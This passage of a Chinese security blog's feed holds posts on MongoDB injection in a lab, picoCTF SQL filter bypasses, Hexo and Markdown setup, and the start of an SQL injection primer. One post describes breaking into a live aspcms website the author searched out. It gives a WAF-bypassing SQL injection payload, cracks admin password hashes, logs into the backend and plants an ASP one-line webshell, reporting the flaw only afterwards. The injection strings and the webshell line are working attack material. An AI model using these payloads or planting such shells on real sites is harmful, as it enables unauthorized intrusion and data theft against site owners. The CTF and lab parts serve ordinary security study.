class="line">进入界面,点击下面的滑动条</span><br><span class="line">http://219.153.49.228:43579/new_list.php?id=1</span><br><span class="line">上sqlmap等普通注入无效</span><br><span class="line">回去看源码，是一个mangodb的数据库，所以sql的注入无效</span><br><span class="line">再看查询的语句:</span><br><span class="line">    db.notice.findOne(&#123;&#x27;id&#x27;:&#x27;<span class="formula">$id&#x27;&#125;);</span></span><br><span class="line"><span class="formula">所以构造poc:</span></span><br><span class="line"><span class="formula">    ?id=1&#x27;&#125;); return(&#123;title:&#x27;1</span></span><br><span class="line"><span class="formula">能够回显1</span></span><br><span class="line"><span class="formula">尝试爆表:</span></span><br><span class="line"><span class="formula">    ?id=1&#x27;&#125;); return(&#123;title:db.getCollectionNames(),content:&#x27;1</span></span><br><span class="line"><span class="formula">因为db.getCollectionNames()返回的是arry</span></span><br><span class="line"><span class="formula">将其转为字符串</span></span><br><span class="line"><span class="formula">    ?id=1&#x27;&#125;); return(&#123;title:tojson(db.getCollectionNames()),content:&#x27;1</span></span><br><span class="line"><span class="formula">    得到</span></span><br><span class="line"><span class="formula">    [&quot;Authority_confidential&quot;, &quot;notice&quot;, &quot;system.indexes&quot;]</span></span><br><span class="line"><span class="formula">对表查数据</span></span><br><span class="line"><span class="formula">    ?id=1&#x27;&#125;); return(&#123;title:tojson(db.Authority_confidential.find()[0]),content:&#x27;1</span></span><br><span class="line"><span class="formula">    爆出数据后登陆后台获得key</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;关于非关系型数据库mongodb的注入&quot;&gt;&lt;a href=&quot;#关于非关系型数据库mongodb的注入&quot; class=&quot;headerlink&quot; title=&quot;关于非关系型数据库mongodb的注入&quot;&gt;&lt;/a&gt;关于非关系型数据库mongodb的注入&lt;/h2&gt;</summary>
    
    
    
    <category term="vuln" scheme="http://example.com/categories/vuln/"/>
    
    
  </entry>
  
  <entry>
    <title>实战</title>
    <link href="http://example.com/2020/10/20/%E5%AE%9E%E6%88%98/"/>
    <id>http://example.com/2020/10/20/%E5%AE%9E%E6%88%98/</id>
    <published>2020-10-20T07:43:25.000Z</published>
    <updated>2021-01-13T08:56:44.986Z</updated>
    
    <content type="html"><![CDATA[<h2 id="真实的渗透经历"><a href="#真实的渗透经历" class="headerlink" title="真实的渗透经历"></a>真实的渗透经历</h2><a id="more"></a><h4 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h4><pre><code><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">因为新生培训，最近重学了一波owsap top10的基础内容，然后想着现在运行的站是不是没有sql注入利用的洞了?</span><br><span class="line">后来看到aspcms框架的漏洞，发现还真有sql的洞，于是就去找哪些还在运行的aspcms的网站，后来找到了，于是试了试payload:</span><br><span class="line">/plug/comment/commentList.asp?id=0<span class="comment">%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now%28%29,null,1%20%20frmasterom%20&#123;prefix&#125;user</span></span><br><span class="line">对这个payload的解释其实进行urldecode之后就变成了：</span><br><span class="line">/plug/comment/commentList.asp?id=0 unmasterion semasterlect top 1 UserID,GroupID,LoginName,Password,now(),null,1  frmasterom &#123;prefix&#125;user</span><br><span class="line">在仔细一看union select top 1 ....就是查数据的sql，只不过利用了waf对于master的单层过滤bypass了，于是爆出了admin以及md5加密过后的密码，admin的密码太难破解了，于是乎，我又看了看sql的payload，发现top 5能够爆出其他数据，于是尝试破解其他的md5值，结果成功破解了超级管理员用户的密码</span><br><span class="line">对域名进行信息收集，获取了后台管理界面的url，利用爆出的数据成功登录</span><br><span class="line"></span><br></pre></td></tr></table></figure></code></pre><p><img src="/image/example1.jpg" alt="展示"><br><img src="/image/example2.jpg" alt="展示"></p><h4 id="web的信息"><a href="#web的信息" class="headerlink" title="web的信息"></a>web的信息</h4><pre><code><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iis10.0 windows的服务器，因为ii7.5以上的版本就已经把解析漏洞给修复了</span><br><span class="line">所以不能利用解析漏洞写入shell</span><br></pre></td></tr></table></figure></code></pre><h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><pre><code><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在aspcms漏洞信息上，发现了一个应该是存储xss的方式写入shell</span><br><span class="line">在管理页面的扩展功能下找到幻灯片设置将前端slidestyle 的value改成</span><br><span class="line">1<span class="comment">%&gt;&lt;%Eval(Request (chr(83)))%&gt;&lt;%</span></span><br><span class="line">保存，即可写入shell，利用菜刀连接，成功拿到shell</span><br></pre></td></tr></table></figure></code></pre><h4 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h4><pre><code><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">补天已收录</span><br></pre></td></tr></table></figure></code></pre>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;真实的渗透经历&quot;&gt;&lt;a href=&quot;#真实的渗透经历&quot; class=&quot;headerlink&quot; title=&quot;真实的渗透经历&quot;&gt;&lt;/a&gt;真实的渗透经历&lt;/h2&gt;</summary>
    
    
    
    <category term="pentest" scheme="http://example.com/categories/pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Blog</title>
    <link href="http://example.com/2020/10/11/Blog/"/>
    <id>http://example.com/2020/10/11/Blog/</id>
    <published>2020-10-11T12:05:00.000Z</published>
    <updated>2021-01-13T08:37:21.385Z</updated>
    
    <content type="html"><![CDATA[<h3 id="利用github托管和hexo打造一个自己的博客"><a href="#利用github托管和hexo打造一个自己的博客" class="headerlink" title="利用github托管和hexo打造一个自己的博客"></a>利用github托管和hexo打造一个自己的博客</h3><a id="more"></a><ol><li>因为这个博客依托于github托管，首先得要有一个github帐号</li><li>找到Repository name设置为本人github的昵称-&gt;create repository</li><li>安装git</li><li>生成ssh密钥文件: ssh-keygen -t rsa -C “你的GitHub注册邮箱”</li><li>git bash 输入cd ~ cat id_rsa.pub,打开github.com-&gt;settings-&gt;keys页面，新建ssh key tittle为标题，随便填，将id_rsa.pub内容粘贴-&gt;add ssh key</li><li>在Git Bash中检测GitHub公钥设置是否成功，输入 ssh <a href="mailto:&#103;&#x69;&#116;&#64;&#x67;&#x69;&#116;&#x68;&#117;&#x62;&#46;&#x63;&#111;&#109;">&#103;&#x69;&#116;&#64;&#x67;&#x69;&#116;&#x68;&#117;&#x62;&#46;&#x63;&#111;&#109;</a>: 收到欢迎信息即可</li><li>安装node.js <a href="https://nodejs.org/en/download/">安装url</a> 在cmd输入 node -v查看是否安装上了-&gt;输入npm -v收到版本信息 安装成功</li><li>安装hexo 新建一个文件夹，用以存放博客的文件，进入文件夹 打开cmd-&gt; npm install -g hexo-cli,安装完成后 hexo init blog</li><li>hexo new test_my_site -&gt; hexo g -&gt; hexo s 打开浏览器 127.0.0.1:4000查看是否配置成功</li><li>选择好看的主题根目录下修改_config.yml</li><li>下一步将我们的Hexo与GitHub关联起来，打开站点的配置文件_config.yml，翻到最后修改为：deploy: type: git repo: 这里填入你之前在GitHub上创建仓库的完整路径，记得加上 .git branch: master</li><li>hexo clean-&gt;hexo g-&gt;hexo d-&gt;d是deploy的缩写。完成后，打开浏览器，在地址栏输入你的放置个人网站的仓库路径，即 <a href="http://xxxx.github.io/">http://xxxx.github.io</a> 然后就能查看自己的博客了</li></ol>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;利用github托管和hexo打造一个自己的博客&quot;&gt;&lt;a href=&quot;#利用github托管和hexo打造一个自己的博客&quot; class=&quot;headerlink&quot; title=&quot;利用github托管和hexo打造一个自己的博客&quot;&gt;&lt;/a&gt;利用github托管和hexo打造一个自己的博客&lt;/h3&gt;</summary>
    
    
    
    <category term="misc" scheme="http://example.com/categories/misc/"/>
    
    
  </entry>
  
  <entry>
    <title>pico-wp</title>
    <link href="http://example.com/2020/10/10/pico-wp/"/>
    <id>http://example.com/2020/10/10/pico-wp/</id>
    <published>2020-10-10T08:51:09.000Z</published>
    <updated>2021-01-13T08:39:17.622Z</updated>
    
    <content type="html"><![CDATA[<h3 id="picoCTF-2020-Mini-Competition-web"><a href="#picoCTF-2020-Mini-Competition-web" class="headerlink" title="picoCTF 2020 Mini-Competition web"></a>picoCTF 2020 Mini-Competition web</h3><a id="more"></a><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pico 2020今年缩水了，不过据说min不是正式的比赛，看看后面怎么说吧</span><br></pre></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Description</span><br><span class="line">Can you beat the filters? Log in as admin</span><br><span class="line">总而言之就是bypass sql注入</span><br></pre></td></tr></table></figure><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一题看filter.php提示把or给过滤了</span><br><span class="line">但是没有关西，admin&#x27;-- password随便输，因为已经被-- 给注释了</span><br></pre></td></tr></table></figure><hr><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第二题 or ,and, = ,--被过滤</span><br><span class="line">直接上admin&#x27;;<span class="comment">%00 password随便输，</span></span><br><span class="line">;<span class="comment">%00很多人会把这个姿势给忘了，这也算是一个注释 </span></span><br><span class="line">贴几个注释符:</span><br><span class="line">#,-- , ;<span class="comment">%00,/**/,//</span></span><br></pre></td></tr></table></figure><hr><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同第二题绕过姿势</span><br></pre></td></tr></table></figure><hr><h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">or , and, =, like, &gt;,&lt;, --, admin</span><br><span class="line">好家伙把admin给过滤了，我直接好家伙</span><br><span class="line">因为吧admin过滤了，尝试了大小写绕过无果</span><br><span class="line">想到了字符串拼接，concat，但是因为有引号的限制，函数无法运行</span><br><span class="line">返回去看到数据库是sqlite，那么sqlite的字符串拼接是用||的</span><br><span class="line">直接上payload</span><br><span class="line">ad&#x27;||&#x27;min&#x27;;<span class="comment">%00 passowrd=123</span></span><br><span class="line">提交成功登陆</span><br></pre></td></tr></table></figure><h4 id="5"><a href="#5" class="headerlink" title="5"></a>5</h4><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">or, and,=, like, &gt;, &lt;, --, union, admin</span><br><span class="line">同第四题姿势，我觉得国外的师傅应该是忘记了;<span class="comment">%00能够直接过滤，所以我这个算非预期解</span></span><br></pre></td></tr></table></figure><h4 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">&quot;round&quot;</span>])) &#123;</span><br><span class="line">    $_SESSION[<span class="string">&quot;round&quot;</span>] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">$round = $_SESSION[<span class="string">&quot;round&quot;</span>];</span><br><span class="line">$filter = <span class="keyword">array</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">$view = ($_SERVER[<span class="string">&quot;PHP_SELF&quot;</span>] == <span class="string">&quot;/filter.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($round === <span class="number">1</span>) &#123;</span><br><span class="line">    $filter = <span class="keyword">array</span>(<span class="string">&quot;or&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ($view) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Round1: &quot;</span>.implode(<span class="string">&quot; &quot;</span>, $filter).<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ($round === <span class="number">2</span>) &#123;</span><br><span class="line">    $filter = <span class="keyword">array</span>(<span class="string">&quot;or&quot;</span>, <span class="string">&quot;and&quot;</span>, <span class="string">&quot;like&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="string">&quot;--&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ($view) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Round2: &quot;</span>.implode(<span class="string">&quot; &quot;</span>, $filter).<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ($round === <span class="number">3</span>) &#123;</span><br><span class="line">    $filter = <span class="keyword">array</span>(<span class="string">&quot; &quot;</span>, <span class="string">&quot;or&quot;</span>, <span class="string">&quot;and&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="string">&quot;like&quot;</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;--&quot;</span>);</span><br><span class="line">    <span class="comment">// $filter = array(&quot;or&quot;, &quot;and&quot;, &quot;=&quot;, &quot;like&quot;, &quot;union&quot;, &quot;select&quot;, &quot;insert&quot;, &quot;delete&quot;, &quot;if&quot;, &quot;else&quot;, &quot;true&quot;, &quot;false&quot;, &quot;admin&quot;);</span></span><br><span class="line">    <span class="keyword">if</span> ($view) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Round3: &quot;</span>.implode(<span class="string">&quot; &quot;</span>, $filter).<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ($round === <span class="number">4</span>) &#123;</span><br><span class="line">    $filter = <span class="keyword">array</span>(<span class="string">&quot; &quot;</span>, <span class="string">&quot;or&quot;</span>, <span class="string">&quot;and&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="string">&quot;like&quot;</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;--&quot;</span>, <span class="string">&quot;admin&quot;</span>);</span><br><span class="line">    <span class="comment">// $filter = array(&quot; &quot;, &quot;/**/&quot;, &quot;--&quot;, &quot;or&quot;, &quot;and&quot;, &quot;=&quot;, &quot;like&quot;, &quot;union&quot;, &quot;select&quot;, &quot;insert&quot;, &quot;delete&quot;, &quot;if&quot;, &quot;else&quot;, &quot;true&quot;, &quot;false&quot;, &quot;admin&quot;);</span></span><br><span class="line">    <span class="keyword">if</span> ($view) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Round4: &quot;</span>.implode(<span class="string">&quot; &quot;</span>, $filter).<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ($round === <span class="number">5</span>) &#123;</span><br><span class="line">    $filter = <span class="keyword">array</span>(<span class="string">&quot; &quot;</span>, <span class="string">&quot;or&quot;</span>, <span class="string">&quot;and&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="string">&quot;like&quot;</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;--&quot;</span>, <span class="string">&quot;union&quot;</span>, <span class="string">&quot;admin&quot;</span>);</span><br><span class="line">    <span class="comment">// $filter = array(&quot;0&quot;, &quot;unhex&quot;, &quot;char&quot;, &quot;/*&quot;, &quot;*/&quot;, &quot;--&quot;, &quot;or&quot;, &quot;and&quot;, &quot;=&quot;, &quot;like&quot;, &quot;union&quot;, &quot;select&quot;, &quot;insert&quot;, &quot;delete&quot;, &quot;if&quot;, &quot;else&quot;, &quot;true&quot;, &quot;false&quot;, &quot;admin&quot;);</span></span><br><span class="line">    <span class="keyword">if</span> ($view) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Round5: &quot;</span>.implode(<span class="string">&quot; &quot;</span>, $filter).<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ($round &gt;= <span class="number">6</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($view) &#123;</span><br><span class="line">        highlight_file(<span class="string">&quot;filter.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $_SESSION[<span class="string">&quot;round&quot;</span>] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;picoCTF-2020-Mini-Competition-web&quot;&gt;&lt;a href=&quot;#picoCTF-2020-Mini-Competition-web&quot; class=&quot;headerlink&quot; title=&quot;picoCTF 2020 Mini-Competition web&quot;&gt;&lt;/a&gt;picoCTF 2020 Mini-Competition web&lt;/h3&gt;</summary>
    
    
    
    <category term="pentest" scheme="http://example.com/categories/pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>markdown</title>
    <link href="http://example.com/2020/10/10/markdown/"/>
    <id>http://example.com/2020/10/10/markdown/</id>
    <published>2020-10-10T07:39:53.000Z</published>
    <updated>2021-01-13T08:38:27.212Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Markdown快速入门（typora）"><a href="#Markdown快速入门（typora）" class="headerlink" title="Markdown快速入门（typora）"></a>Markdown快速入门（typora）</h1><a id="more"></a><h2 id="代码块："><a href="#代码块：" class="headerlink" title="代码块："></a>代码块：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#代码块语法</span></span><br><span class="line">​```pytyhon,java,shell等</span><br></pre></td></tr></table></figure><h2 id="2-标题"><a href="#2-标题" class="headerlink" title="2.标题"></a>2.标题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;标题语法</span><br><span class="line"># 一级标题</span><br><span class="line">## 二级标题</span><br><span class="line">一直到六级标题</span><br></pre></td></tr></table></figure><h2 id="3-字体"><a href="#3-字体" class="headerlink" title="3.字体"></a>3.字体</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加粗</span></span><br><span class="line">**hello**</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除</span></span><br><span class="line">    ~~要去掉的内容~~</span><br><span class="line">    <span class="comment">//斜体</span></span><br><span class="line">    *给我斜*</span><br></pre></td></tr></table></figure><p>// 加粗<br><strong>hello</strong><br>  //删除<br>    <del>要去掉的内容</del><br>    //斜体<br>    <em>给我斜</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//引用语法</span></span><br><span class="line">&gt;作者:<span class="number">123</span></span><br><span class="line">&gt;&gt;作者:<span class="number">234</span></span><br><span class="line">&gt;&gt;&gt;作者:<span class="number">456</span></span><br></pre></td></tr></table></figure><p>//引用语法</p><blockquote><p>作者:123</p><blockquote><p>作者:234</p><blockquote><p>作者:456</p></blockquote></blockquote></blockquote><h2 id="5-分割线"><a href="#5-分割线" class="headerlink" title="5.分割线"></a>5.分割线</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分割线1</span></span><br><span class="line">---</span><br><span class="line"><span class="comment">//分割线2</span></span><br><span class="line">***</span><br></pre></td></tr></table></figure><h2 id="分割线1"><a href="#分割线1" class="headerlink" title="//分割线1"></a>//分割线1</h2><p>//分割线2</p><hr><h2 id="6-图片插入"><a href="#6-图片插入" class="headerlink" title="6.图片插入"></a>6.图片插入</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在线图片/本地图片</span></span><br><span class="line">![好康的照片]](/image/me.png)</span><br></pre></td></tr></table></figure><p><img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1602168267104&di=681d763c0379260ac0cbada3cf0e7c1e&imgtype=0&src=http://h.hiphotos.baidu.com/zhidao/pic/item/c2cec3fdfc039245092e36068b94a4c27d1e2524.jpg" alt="好康的照片"></p><h2 id="7-超链接"><a href="#7-超链接" class="headerlink" title="7.超链接"></a>7.超链接</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//超链接语法</span></span><br><span class="line">[我的github](https:<span class="comment">//github.com/yueqsun)</span></span><br></pre></td></tr></table></figure><p>//超链接语法<br><a href="https://github.com/yueqsun">我的github</a></p><h2 id="8-列表语法"><a href="#8-列表语法" class="headerlink" title="8.列表语法"></a>8.列表语法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//无序列表</span></span><br><span class="line">- 目录<span class="number">1</span></span><br><span class="line">- 目录<span class="number">2</span></span><br><span class="line">- 目录<span class="number">3</span></span><br><span class="line">- 目录<span class="number">4</span></span><br><span class="line"><span class="comment">//有序列表</span></span><br><span class="line"><span class="number">1.</span> abc</span><br><span class="line"><span class="comment">//回车后自动跳转</span></span><br></pre></td></tr></table></figure><p>//无序列表</p><ul><li>目录1</li><li>目录2</li><li>目录3</li><li>目录4</li></ul><p>//有序列表</p><ol><li>abc</li><li>efg</li></ol><h2 id="9-表格"><a href="#9-表格" class="headerlink" title="9.表格"></a>9.表格</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//右键插入设置行和列</span></span><br><span class="line"><span class="comment">//按住ctr+/可以查看源码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Markdown快速入门（typora）&quot;&gt;&lt;a href=&quot;#Markdown快速入门（typora）&quot; class=&quot;headerlink&quot; title=&quot;Markdown快速入门（typora）&quot;&gt;&lt;/a&gt;Markdown快速入门（typora）&lt;/h1&gt;</summary>
    
    
    
    <category term="misc" scheme="http://example.com/categories/misc/"/>
    
    
  </entry>
  
  <entry>
    <title>sql注入篇</title>
    <link href="http://example.com/2020/10/10/sql%E6%B3%A8%E5%85%A5%E7%AF%87/"/>
    <id>http://example.com/2020/10/10/sql%E6%B3%A8%E5%85%A5%E7%AF%87/</id>
    <published>2020-10-10T00:39:39.000Z</published>
    <updated>2021-01-13T08:39:31.056Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先什么是sql注入，sql注入是恶意用户将恶意的sql语句提交给服务端，并且带入数据库进行查询最终爆出各种数据的攻击手段</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ol><li>拥有可控的变量，例如get查询的id等</li><li>可控的变量带入了数据库查询</li><li>变量没有过滤或者过滤不严格导致了sql语句能够带入数据库查询</li></ol><h2 id="具体危害"><a href="#具体危害" class="headerlink" title="具体危害"></a>具体危害</h2><ol><li>数据库数据泄露导致后台被控制-&gt;导致web权限被控制-&gt;导致服务器权限被控制</li><li>文件操作 如：写入shell，读取文件源码</li></ol><h2 id="注入发现和利用"><a href="#注入发现和利用" class="headerlink" title="注入发现和利用"></a>注入发现和利用</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">由于sql注入属于web应用，发现的话可以采用web扫描器或手工检测</span><br><span class="line">常用sqlmap</span><br></pre></td></tr></table></figure><h2 id="sql注入的攻击方式"><a href="#sql注入的攻击方式" class="headerlink" title="sql注入的攻击方式"></a>sql注入的攻击方式</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 数据库类型:mysql,sqlite,oracle,access,postgresql,....</span><br><span class="line">2. 参数传递提交的方式，get，post，cookie，delete，insert....</span><br><span class="line">3. sql注入分类:盲注，sql查询类型等</span><br></pre></td></tr></table></figure><h3 id="mysql注入"><a href="#mysql注入" class="headerlink" title="mysql注入"></a>mysql注入</h3><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql数据库的结构分层</span><br><span class="line">    1.库名，表名，列名，数据库用户等</span><br><span class="line">        mysql自带的 </span><br><span class="line">            information_schema.schemata 管理所有数据库名信息的表</span><br><span class="line">            information_schema.tables   管理所有数据库内表名信息的表</span><br><span class="line">            information_schema.columns  管理所有数据库内表字段名信息的表</span><br><span class="line">        数据库用户:</span><br><span class="line">            root和普通用户权限</span><br><span class="line">            root可跨库查询以及对文件进行读写操作</span><br><span class="line">    2.数据库与web应用相结合的架构关系</span><br><span class="line">        client &lt;-&gt; server &lt;-&gt; databases</span><br></pre></td></tr></table></figure><h4 id="具体注入的姿势"><a href="#具体注入的姿势" class="headerlink" title="具体注入的姿势"></a>具体注入的姿势</h4><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 